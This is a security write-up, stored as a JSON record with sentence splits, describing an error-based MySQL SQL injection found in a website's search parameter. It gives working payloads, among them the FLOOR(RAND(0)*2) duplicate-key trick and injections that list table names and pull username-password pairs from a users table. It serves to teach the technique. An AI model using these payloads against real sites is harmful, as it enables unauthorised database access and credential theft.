{"name": "1037", "parent": "", "content": "Exploit database error to leak users table informations ( writeup\u00a0) Hi everybody I don\u2019t post much write-ups online because most of the work done privately and under NDA\u00a0, but this time i decided to publish this (anonymously after website owner agreed ) because too many developers insists that you can\u2019t exploit complicated SQL\u00a0, or non result SQL (example: count(*) sql). First I got a call from one of my friends told me that a hacker contacted them and told them that he found a sql-injection in their website and express his intentions to blackmail them. I opened the website and tried to play with the parameter just to check\u00a0, in a couple of minutes i found a bug in their search page\u00a0.search page make ajax request when you filter the result to the page\u00a0, the term parameter is the one is not filtered. /?FilterThemes?tags[]=free&term=' it generates a database error page with full sql dump ( debug on mode\u00a0:) ). ERROR 1064You have an error in your SQL syntax; check the manual that corresponds to your MYSQL server version for the right syntax to use near '',themes.tag_title) != 0' at line 1 SELECT COUNT(*) FROM (`themes`) JOIN `authors` on `authors`.`id` = `themes`.`author` FIND_IN_SET(''',themes.tag_title) != 0 or `themes`.`title` like '%'%' or `themes`.`desc` like '%'%' AND match (themes.tag_title) against ('free' in boolean mode) order by `themes`.`id` desc limit 12 Awesome\u00a0, but oh wait\u00a0\u2026 the parameter pass first to count query before it pass to aggregate query.. so must our payload pass the two queries and execute it with union.. OR\u00a0\u2026. I remembered uncommon way we used it to exploit blind SQL injection which don\u2019t generate any result to the browser\u200a\u2014\u200athis way can done only if errors is displayed, great that what we have here\u00a0, right! The POC lets change the payload for a poc /?FilterThemes?tags[]=free&term=d%' AND (SELECT 1337 FROM(SELECT COUNT(*),CONCAT('hello',FLOOR(RAND(0)*2),'world')x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND '%'=' BINGO\u00a0:) ERROR 1062 Duplicate entry 'hello1world' for key 'group_key' SELECT COUNT(*) FROM (`themes`) JOIN `authors` on `authors`.`id` = `themes`.`author` FIND_IN_SET('d%' AND (SELECT 1337 FROM(SELECT COUNT(*),CONCAT('hello',FLOOR(RAND(0)*2),'world')x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND '%'='',themes.tag_title) != 0 or `themes`.`title` like '%d%' AND (SELECT 1337 FROM(SELECT COUNT(*),CONCAT('hello',FLOOR(RAND(0)*2),'world')x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND '%'='%' or `themes`.`desc` like '%d%' AND (SELECT 1337 FROM(SELECT COUNT(*),CONCAT('hello',FLOOR(RAND(0)*2),'world')x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND '%'='%' AND match (themes.tag_title) against ('free' in boolean mode) order by `themes`.`id` desc limit 12 Did you notice\u00a0:)\u00a0, the expression CONCAT('hello',FLOOR(RAND(0)*2),'world') has been evaluated and displayed\u00a0:) let me explain the sql query and how it works before we finish our exploit. There is some information you needs to know about MySQL. To understand more, lets try some queries on our terminal. Select count(*) from INFORMATION_SCHEMA.CHARACTER_SETS; Normal count sql to count the number of records inside Information Scheme database (default database in mysql). now lets play with this sql a little. select count(*), version() x from INFORMATION_SCHEMA.CHARACTER_SETS group by x again nothing special\u00a0, we added version() (function retrieve the mysql version) and named it x and then we grouped by it. +----------+----------------------------------------+| count(*) | x                                      |+----------+----------------------------------------+|       40 | 10.2.3-MariaDB-10.2.3+maria~xenial-log |+----------+----------------------------------------+ Ok lets be aggressive SELECT count(*), CONCAT(version(),floor(rand(0) *2)) x from INFORMATION_SCHEMA.CHARACTER_SETS group by x; We added a little change ( floor(rand(0) * 2) ) and if you run this sql you will get ERROR 1062 (23000): Duplicate entry '10.2.3-MariaDB-10.2.3+maria~xenial-log1' for key 'group_key' Do you remember the information i told you before about Mysql requires group key to be unique\u00a0:). the ( floor(rand(0) * 2) ) generates a sequence of 0, 1, 1, 0, 1, 1and the version() will be always the same. so the the first iteration of count(*) will be CONCAT(version(),floor(rand(0) *2))\u00a0=\u00a010.2.3-MariaDB-10.2.3+maria~xenial-log0 Then CONCAT(version(),floor(rand(0) *2))\u00a0=\u00a010.2.3-MariaDB-10.2.3+maria~xenial-log1 Then CONCAT(version(),floor(rand(0) *2))\u00a0=\u00a010.2.3-MariaDB-10.2.3+maria~xenial-log1 => here will be duplicated\u00a0;) then we got the error Duplicate entry '10.2.3-MariaDB-10.2.3+maria~xenial-log1' for key 'group_key' do you got it\u00a0:) lets back to our exploitation. We got the error\u00a0, we got the leak\u00a0.. now we need some valuable informations. Starting with INFORMATION_SCHEME.tables\u00a0, we can grab tables names. with simple script we can grab all tables names by extracting the result from the db error\u00a0, just feed the script with payload. %d%' AND (SELECT 1337 FROM(SELECT COUNT(*),CONCAT((select TABLE_NAME from INFORMATION_SCHEMA.TABLES LIMIT 1,1),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a) AND '%'='% now we know the users table. modifying the script with the new payload to grab users data. %d%' AND (SELECT 1337 FROM(SELECT COUNT(*),CONCAT((select concat(username,'-',password) from users LIMIT 1,1),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a) AND '%'='% Thats it. Lesson learned Stay safe. ", "title": "Exploit database error to leak users table informations ( writeup\u00a0)", "sentences": [{"d9a2": "Exploit database error to leak users table informations ( writeup\u00a0)"}, {"976f": "Hi everybody"}, {"e4bd": "I don\u2019t post much write-ups online because most of the work done privately and under NDA\u00a0, but this time i decided to publish this (anonymously after website owner agreed ) because too many developers insists that you can\u2019t exploit complicated SQL\u00a0, or non result SQL (example: count(*) sql)."}, {"8700": "First I got a call from one of my friends told me that a hacker contacted them and told them that he found a sql-injection in their website and express his intentions to blackmail them."}, {"527f": "I opened the website and tried to play with the parameter just to check\u00a0, in a couple of minutes i found a bug in their search page\u00a0.search page make ajax request when you filter the result to the page\u00a0, the term parameter is the one is not filtered."}, {"abe2": "/?FilterThemes?tags[]=free&term='"}, {"fbaa": "it generates a database error page with full sql dump ( debug on mode\u00a0:) )."}, {"80c3": "ERROR 1064You have an error in your SQL syntax; check the manual that corresponds to your MYSQL server version for the right syntax to use near '',themes.tag_title) != 0' at line 1"}, {"807b": "SELECT COUNT(*) FROM (`themes`) JOIN `authors` on `authors`.`id` = `themes`.`author` FIND_IN_SET(''',themes.tag_title) != 0 or `themes`.`title` like '%'%' or `themes`.`desc` like '%'%' AND match (themes.tag_title) against ('free' in boolean mode) order by `themes`.`id` desc limit 12"}, {"b5f8": "Awesome\u00a0, but oh wait\u00a0\u2026"}, {"e9a1": "the parameter pass first to count query before it pass to aggregate query.. so must our payload pass the two queries and execute it with union.."}, {"8c80": "OR\u00a0\u2026."}, {"3d6b": "I remembered uncommon way we used it to exploit blind SQL injection which don\u2019t generate any result to the browser\u200a\u2014\u200athis way can done only if errors is displayed, great that what we have here\u00a0, right!"}, {"c12a": "The POC"}, {"172b": "lets change the payload for a poc"}, {"afeb": "/?FilterThemes?tags[]=free&term=d%' AND (SELECT 1337 FROM(SELECT COUNT(*),CONCAT('hello',FLOOR(RAND(0)*2),'world')x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND '%'='"}, {"fd4d": "BINGO\u00a0:)"}, {"28ff": "ERROR 1062 Duplicate entry 'hello1world' for key 'group_key'"}, {"195d": "SELECT COUNT(*) FROM (`themes`) JOIN `authors` on `authors`.`id` = `themes`.`author` FIND_IN_SET('d%' AND (SELECT 1337 FROM(SELECT COUNT(*),CONCAT('hello',FLOOR(RAND(0)*2),'world')x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND '%'='',themes.tag_title) != 0 or `themes`.`title` like '%d%' AND (SELECT 1337 FROM(SELECT COUNT(*),CONCAT('hello',FLOOR(RAND(0)*2),'world')x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND '%'='%' or `themes`.`desc` like '%d%' AND (SELECT 1337 FROM(SELECT COUNT(*),CONCAT('hello',FLOOR(RAND(0)*2),'world')x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND '%'='%' AND match (themes.tag_title) against ('free' in boolean mode) order by `themes`.`id` desc limit 12"}, {"582c": "Did you notice\u00a0:)\u00a0, the expression CONCAT('hello',FLOOR(RAND(0)*2),'world') has been evaluated and displayed\u00a0:)"}, {"7df5": "let me explain the sql query and how it works before we finish our exploit."}, {"c4d0": "There is some information you needs to know about MySQL."}, {"d18e": "To understand more, lets try some queries on our terminal."}, {"45f1": "Select count(*) from INFORMATION_SCHEMA.CHARACTER_SETS;"}, {"587a": "Normal count sql to count the number of records inside Information Scheme database (default database in mysql). now lets play with this sql a little."}, {"88fe": "select count(*), version() x from INFORMATION_SCHEMA.CHARACTER_SETS group by x"}, {"ebcf": "again nothing special\u00a0, we added version() (function retrieve the mysql version) and named it x and then we grouped by it."}, {"6975": "+----------+----------------------------------------+| count(*) | x                                      |+----------+----------------------------------------+|       40 | 10.2.3-MariaDB-10.2.3+maria~xenial-log |+----------+----------------------------------------+"}, {"277b": "Ok lets be aggressive"}, {"1b82": "SELECT count(*), CONCAT(version(),floor(rand(0) *2)) x from INFORMATION_SCHEMA.CHARACTER_SETS group by x;"}, {"8710": "We added a little change ( floor(rand(0) * 2) ) and if you run this sql you will get"}, {"fd20": "ERROR 1062 (23000): Duplicate entry '10.2.3-MariaDB-10.2.3+maria~xenial-log1' for key 'group_key'"}, {"bcb0": "Do you remember the information i told you before about Mysql requires group key to be unique\u00a0:)."}, {"04cb": "the ( floor(rand(0) * 2) ) generates a sequence of 0, 1, 1, 0, 1, 1and the version() will be always the same."}, {"21fa": "so the the first iteration of count(*) will be"}, {"425b": "CONCAT(version(),floor(rand(0) *2))\u00a0=\u00a010.2.3-MariaDB-10.2.3+maria~xenial-log0"}, {"d06f": "Then"}, {"6863": "CONCAT(version(),floor(rand(0) *2))\u00a0=\u00a010.2.3-MariaDB-10.2.3+maria~xenial-log1"}, {"4140": "Then"}, {"95cc": "CONCAT(version(),floor(rand(0) *2))\u00a0=\u00a010.2.3-MariaDB-10.2.3+maria~xenial-log1 => here will be duplicated\u00a0;) then we got the error"}, {"1760": "Duplicate entry '10.2.3-MariaDB-10.2.3+maria~xenial-log1' for key 'group_key'"}, {"b7be": "do you got it\u00a0:)"}, {"0b17": "lets back to our exploitation."}, {"2c53": "We got the error\u00a0, we got the leak\u00a0.. now we need some valuable informations."}, {"501a": "Starting with INFORMATION_SCHEME.tables\u00a0, we can grab tables names."}, {"3f24": "with simple script we can grab all tables names by extracting the result from the db error\u00a0, just feed the script with payload."}, {"d1b5": "%d%' AND (SELECT 1337 FROM(SELECT COUNT(*),CONCAT((select TABLE_NAME from INFORMATION_SCHEMA.TABLES LIMIT 1,1),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a) AND '%'='%"}, {"cfa6": "now we know the users table. modifying the script with the new payload to grab users data."}, {"7d0a": "%d%' AND (SELECT 1337 FROM(SELECT COUNT(*),CONCAT((select concat(username,'-',password) from users LIMIT 1,1),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a) AND '%'='%"}, {"8275": "Thats it."}, {"9842": "Lesson learned"}, {"863e": "Stay safe."}], "child": "1037_1\t1037_2"}